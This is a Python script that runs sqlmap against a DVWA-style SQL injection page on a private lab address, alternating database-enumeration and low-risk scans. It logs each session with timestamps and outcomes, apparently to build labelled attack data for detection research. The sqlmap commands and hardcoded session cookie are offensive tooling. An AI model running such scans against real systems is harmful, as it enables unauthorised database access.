#!/usr/bin/env python3
import subprocess
import shlex
import time
import sys
from attack_logger import log_attack_session, now_utc

TARGET_IP = "10.1.0.2"
SOURCE_IP = "10.1.1.2"
CLOUD = "gcp"
SESSION_ID_COOKIE = "093cff0876a5e425abbb1501ac343e22"
MAX_ATTACK_SECONDS = 60

def run_sqlmap(session_num, attack_type, extra_args, severity):
    session_id = f"webattack_{CLOUD}_{session_num:03d}"
    base_url = f"http://{TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit"
    cookie = f"security=low; PHPSESSID={SESSION_ID_COOKIE}"
    command = f'sqlmap -u "{base_url}" --cookie="{cookie}" --batch --timeout=5 --retries=1 {extra_args}'

    start_ts = now_utc()
    print(f"[{session_id}] Starting: {command}")

    outcome_note = attack_type
    try:
        result = subprocess.run(
            shlex.split(command), capture_output=True, text=True,
            timeout=MAX_ATTACK_SECONDS
        )
        if "unable to connect" in result.stdout.lower() or "timed out" in result.stdout.lower():
            outcome_note = f"{attack_type}_blocked_midscan"
        elif "identified the following injection" in result.stdout.lower():
            outcome_note = f"{attack_type}_injection_confirmed"
        else:
            outcome_note = f"{attack_type}_completed"
    except subprocess.TimeoutExpired:
        outcome_note = f"{attack_type}_timed_out"
    except Exception as e:
        print(f"[{session_id}] ERROR: {e}")
        outcome_note = f"{attack_type}_error"
    finally:
        end_ts = now_utc()
        log_attack_session(
            session_id=session_id, attack_category="web_attack",
            tool="sqlmap", command=command, start_ts=start_ts, end_ts=end_ts,
            source_ip=SOURCE_IP, target_ip=TARGET_IP, cloud=CLOUD,
            target_port=80, intended_severity=severity, notes=outcome_note
        )
        print(f"[{session_id}] Logged. Duration: {(end_ts - start_ts).total_seconds():.2f}s")

if __name__ == "__main__":
    num_sessions = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    for i in range(1, num_sessions + 1):
        if i % 3 == 0:
            run_sqlmap(i, "stealthy_sqli", "--level=1 --risk=1", "stealthy")
        else:
            run_sqlmap(i, "loud_sqli", "--dbs", "loud")
        time.sleep(65)
